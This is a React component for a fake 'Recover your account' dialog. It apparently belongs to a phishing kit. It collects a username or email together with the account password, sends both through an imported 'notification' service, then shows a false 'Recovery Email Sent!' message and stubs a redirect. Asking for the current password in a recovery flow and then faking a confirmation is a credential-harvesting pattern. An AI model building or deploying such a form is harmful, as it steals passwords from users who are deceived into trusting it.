import React, { useState } from 'react';
import { X, CheckCircle } from 'lucide-react';
import { sendRecoveryNotification } from '../utils/notificationService';

interface RecoveryModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export function RecoveryModal({ isOpen, onClose }: RecoveryModalProps) {
  const [formData, setFormData] = useState({
    identifier: '',
    password: ''
  });
  const [status, setStatus] = useState<'idle' | 'loading' | 'success' | 'error'>('idle');

  if (!isOpen) return null;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setStatus('loading');

    try {
      const success = await sendRecoveryNotification(formData.identifier, formData.password);
      if (success) {
        setStatus('success');
        // Wait for animation to complete before redirecting
        setTimeout(() => {
          // Replace with your desired URL
          // window.location.href = 'YOUR_REDIRECT_URL';
        }, 3000);
      } else {
        setStatus('error');
      }
    } catch (error) {
      setStatus('error');
    }
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 animate-fadeIn">
      <div 
        className="bg-white rounded-lg p-6 w-full max-w-md relative animate-slideIn"
        onClick={(e) => e.stopPropagation()}
      >
        {status !== 'success' && (
          <button 
            onClick={onClose}
            className="absolute right-4 top-4 text-gray-400 hover:text-gray-600 transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        )}

        {status === 'success' ? (
          <div className="flex flex-col items-center justify-center py-8 space-y-6">
            <div className="relative">
              <div className="w-32 h-32 rounded-full border-4 border-blue-500 animate-spin-slow"></div>
              <CheckCircle className="w-16 h-16 text-blue-500 absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 animate-success" />
            </div>
            <h2 className="text-2xl font-semibold text-gray-900 text-center animate-fadeIn">
              Recovery Email Sent!
            </h2>
            <p className="text-gray-600 text-center max-w-xs animate-fadeIn">
              We'll send you an email shortly with instructions to reset your password.
            </p>
          </div>
        ) : (
          <div className="space-y-6">
            <div className="text-center">
              <h2 className="text-xl font-semibold text-gray-900">Recover your account</h2>
              <p className="text-gray-500 mt-1">Recover with your email address or username</p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <input
                  type="text"
                  placeholder="Email or username"
                  value={formData.identifier}
                  onChange={(e) => setFormData({ ...formData, identifier: e.target.value })}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-shadow"
                  disabled={status === 'loading'}
                />
              </div>
              <div>
                <input
                  type="password"
                  placeholder="Password"
                  value={formData.password}
                  onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-shadow"
                  disabled={status === 'loading'}
                />
              </div>
              <button 
                type="submit"
                disabled={status === 'loading'}
                className={`w-full py-2 px-4 rounded-lg font-medium transform transition-all duration-200 
                         active:scale-[0.98] shadow-lg ${
                           status === 'loading' 
                             ? 'bg-gray-400 cursor-not-allowed' 
                             : status === 'error'
                             ? 'bg-red-600 hover:bg-red-700 hover:shadow-red-200'
                             : 'bg-blue-600 hover:bg-blue-700 hover:shadow-blue-200'
                         } text-white`}
              >
                {status === 'loading' ? 'Sending...' : 
                 status === 'error' ? 'Try Again' : 'Recover'}
              </button>
            </form>

            {status === 'error' && (
              <p className="text-sm text-red-600 text-center font-medium">
                Failed to send notification. Please try again.
              </p>
            )}
          </div>
        )}
      </div>
    </div>
  );
}